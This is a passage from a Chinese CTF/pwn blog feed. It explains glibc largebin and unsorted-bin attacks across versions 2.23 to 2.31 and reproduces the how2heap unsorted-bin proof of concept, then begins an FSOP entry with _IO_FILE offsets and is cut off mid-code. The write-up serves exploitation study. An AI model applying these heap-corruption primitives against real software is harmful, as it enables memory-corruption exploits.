victim;</span><br></pre></td></tr></table></figure><p>这里的第二个if判断的就是size如果小于最小的size的时候发生的事情，但是那里的内容相较于下面不是很好利用。所以直接看下面。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">        == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">        fwd = fwd-&gt;fd; </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    bck = fwd-&gt;bk;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>这里就是我们主要的利用代码，这里的if判断的是找到相同size的chunk发生什么，但是我们真正利用的代码其实是else里面的。现在假设我们存在一个已经在large bin的chunk1：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="number">0x450</span>;</span><br><span class="line">&#123;</span><br><span class="line">    fd = <span class="number">0</span>;</span><br><span class="line">    bk = <span class="number">0</span>;</span><br><span class="line">    fd_nextsize = <span class="number">0</span>;</span><br><span class="line">    bk_nextsize = target<span class="number">-0x20</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和一个在unsorted bin当中的chunk2：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="number">0x460</span>;</span><br><span class="line">&#123;</span><br><span class="line">    fd = <span class="number">0</span>;</span><br><span class="line">    bk = <span class="number">0</span>;</span><br><span class="line">    fd_nextsize = <span class="number">0</span>;</span><br><span class="line">    bk_nextsize = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们下一次malloc一个size大于0x460的chunk时那么chunk2就会进入large bin，此时就会执行以下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p>翻译过来就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chunk2-&gt;fd_nextsize = chunk1;</span><br><span class="line">chunk2-&gt;bk_nextsize = chunk1-&gt;bk_nextsize; <span class="comment">// chunk1-&gt;bk_nextsize = target-0x20</span></span><br><span class="line"><span class="comment">// 这一步过后，chunk2-&gt;bk_next_size也就变成了target-0x20</span></span><br><span class="line">chunk1-&gt;bk_nextsize = chunk2;</span><br><span class="line">chunk2-&gt;bk_nextsize-&gt;fd_nextsize = chunk2;</span><br><span class="line"><span class="comment">// 所以这一步最终的形式其实是</span></span><br><span class="line">*(target<span class="number">-0x20</span>)-&gt;fd_nextsize = chunk2;</span><br></pre></td></tr></table></figure><p>victim这样就在target位置写上了chunk2的地址。</p><p>另外在这里还存在另一个可以任意地址写入堆地址的地方：</p><p>此时chunk1变为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="number">0x450</span>;</span><br><span class="line">&#123;</span><br><span class="line">    fd = <span class="number">0</span>;</span><br><span class="line">    bk = target<span class="number">-0x10</span>;</span><br><span class="line">    fd_nextsize = <span class="number">0</span>;</span><br><span class="line">    bk_nextsize = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bck = fwd-&gt;bk;   上面执行完之后有这样一句</span></span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>翻译过来也就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk2-&gt;bk = target<span class="number">-0x10</span>;</span><br><span class="line">chunk2-&gt;fd = chunk1;</span><br><span class="line">chunk1-&gt;bk = chunk2;</span><br><span class="line">*(target<span class="number">-0x10</span>)-&gt;fd = chunk2;</span><br></pre></td></tr></table></figure><p>也就是如果同时修改了bk和bk_nextsize的话可以同时修改两处地址的值为堆地址。</p><h2 id="Glibc2-29下的largebin-attack"><a href="#Glibc2-29下的largebin-attack" class="headerlink" title="Glibc2.29下的largebin attack"></a>Glibc2.29下的largebin attack</h2><p>这里的攻击方式和上面的很类似，首先看一下源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">    victim_index = largebin_index (size); </span><br><span class="line">      bck = bin_at (av, victim_index);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">      <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">  &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = bck;</span><br><span class="line">              bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">              victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; </span><br><span class="line">              fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              assert (chunk_main_arena (fwd));</span><br><span class="line">              <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                &#123;</span><br><span class="line">                  fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">assert (chunk_main_arena (fwd));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">// but size must be different</span></span><br><span class="line">              <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">== (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                  fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; </span><br><span class="line">                &#125;</span><br><span class="line">              bck = fwd-&gt;bk;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br></pre></td></tr></table></figure><p>其实很明显的可以看出来下面仍然存在相应的漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; </span><br></pre></td></tr></table></figure><h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>在这里说一下unsorted bin attack，虽然在2.29出来之后基本就没法利用了但是害怕题目出的libc版本在以往的版本然后又限制大小所以这里还是提一下unsorted bin attack</p><p>这里就不提出全部源码就把存在漏洞的两行提出来：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>可以看出来如果我们可以控制unsorted_chunks (av)的bk指针，那就可以向任意地址写入堆地址了。</p><p>这里直接给出how2heap当中的poc吧：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stackn&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attacknn&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %ldnn&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now, we allocate first normal chunk on the heap at: %pn&quot;</span>,p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot;the first one during the free()nn&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">           <span class="string">&quot;point to %pn&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    p[<span class="number">1</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointern&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%pnn&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, target should has already been &quot;</span></span><br><span class="line">           <span class="string">&quot;rewrite:n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %pn&quot;</span>, &amp;stack_var, (<span class="keyword">void</span>*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写的很详细，如果看不懂可以-g编译调试一下。</p><h2 id="Glibc2-31下的largebin-attack"><a href="#Glibc2-31下的largebin-attack" class="headerlink" title="Glibc2.31下的largebin attack"></a>Glibc2.31下的largebin attack</h2><p>先看一下源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fwd != bck)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">    size |= PREV_INUSE;</span><br><span class="line">    <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">    assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">        &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">    &#123;</span><br><span class="line">        fwd = bck;</span><br><span class="line">        bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        assert (chunk_main_arena (fwd));</span><br><span class="line">        <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">        &#123;</span><br><span class="line">            fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">            assert (chunk_main_arena (fwd));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">            == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">            <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">            fwd = fwd-&gt;fd;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            victim-&gt;fd_nextsize = fwd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">            fwd-&gt;bk_nextsize = victim;</span><br><span class="line">            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">        bck = fwd-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看到西面我们以前利用的地方都加上了检查，导致我们没法再从这个地方出发利用了，但是上面是没有任何保护的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">    &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实根据上面几个版本的glibc来看这里的利用思路其实是挺明显的，我们只需要修改fwd-&gt;fd-&gt;bk_nextsize也能实现上面的操作。</p><p>比如，现在存在一个已经在large bin 当中的chunk1：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="number">0x460</span></span><br><span class="line">&#123;</span><br><span class="line">    fd = largebin(index); <span class="comment">// 其实在最上面的图能够看出来这里其实保存的是largebin当中相应的位置</span></span><br><span class="line">    bk = largebin(index);</span><br><span class="line">    fd_nextsize = <span class="number">0</span>;</span><br><span class="line">    bk_nextsize = target<span class="number">-0x20</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个即将放入large bin当中的chunk2：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="number">0x450</span></span><br><span class="line">&#123;</span><br><span class="line">    fd = <span class="number">0</span>;</span><br><span class="line">    bk = <span class="number">0</span>;</span><br><span class="line">    fd_nextsize = <span class="number">0</span>;</span><br><span class="line">    bk_nextsize = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到将上面的翻译下来其实就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk2-&gt;fd_nextsize = largebin(index);</span><br><span class="line">chunk2-&gt;bk_nextsize = largebin(index)-&gt;bk_nextsize;<span class="comment">// 这里的largebin一定存放的是chunk1所以后面的表达式等价于chunk1-&gt;bk_nextsize也就是target-0x20</span></span><br><span class="line">*(target<span class="number">-0x20</span>)-&gt;fd_nextsize = chunk2;<span class="comment">// 前面的那个不需要管</span></span><br></pre></td></tr></table></figure><p>这样也就同样实现了任意地址写上堆地址。</p><p>任意地址写上堆地址的利用方式很多，比如VN那道题为FSOP做铺垫，或则修改global_max_fast的值到一个很大的值，为fastbin attack做铺垫，一般来说这种攻击手法都是为其他的攻击手法做铺垫的。</p><hr><p>参考链接：</p><p><a class="link"   href="https://www.anquanke.com/post/id/244018" >https://www.anquanke.com/post/id/244018<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;关于largebin的原理这里就只给一张图吧，也是在网上找的(我懒得画)。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/20190516131203-242dd8f2-7799-1.png&quot; alt=&quot;20190516131203-242dd8f2-7799-1&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="largebin attack" scheme="https://cv196082.gitee.io/tags/largebin-attack/"/>
    
  </entry>
  
  <entry>
    <title>FSOP</title>
    <link href="https://cv196082.gitee.io/2022/02/23/FSOP/"/>
    <id>https://cv196082.gitee.io/2022/02/23/FSOP/</id>
    <published>2022-02-23T03:50:09.000Z</published>
    <updated>2022-02-23T03:54:51.488Z</updated>
    
    <content type="html"><![CDATA[<p>文章开头给出_IO_FILE结构体的偏移:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br></pre></td></tr></table></figure><h2 id="Glibc2-23下的FSOP"><a href="#Glibc2-23下的FSOP" class="headerlink" title="Glibc2.23下的FSOP"></a>Glibc2.23下的FSOP</h2><p>FSOP全称是<code>File Stream Oriented Programming</code>进程中打开的所有文件结构体使用一个单链表来进行管理，即通过<code>_IO_list_all</code>进行管理，在<a href="https://ray-cp.github.io/archivers/IO_FILE_fopen_analysis"><code>fopen</code></a>的分析中，我们知道了fopen是通过<code>_IO_link_in</code>函数将新打开的结构体链接进入<code>_IO_list_all</code>的，相关的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line">...</span><br><span class="line">fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">_IO_list_all = fp;</span><br></pre></td></tr></table></figure><p>从代码中也可以看出来链表是通过FILE结构体的<code>_chain</code>字段来进行链接的。所以也就形成了链表。</p><p>看到链表的操作，应该就大致猜到了FSOP的主要原理了。即通过伪造<code>_IO_list_all</code>中的节点来实现对FILE链表的控制以实现利用目的。通常来说一般是直接利用任意写的漏洞修改<code>_IO_list_all</code>直接指向可控的地址。</p><p>具体来说该如何利用呢？glibc中有一个函数<code>_IO_flush_all_lockp</code>，该函数的功能是刷新所有FILE结构体的输出缓冲区，相关源码如下，文件在<code>libio\genops</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span 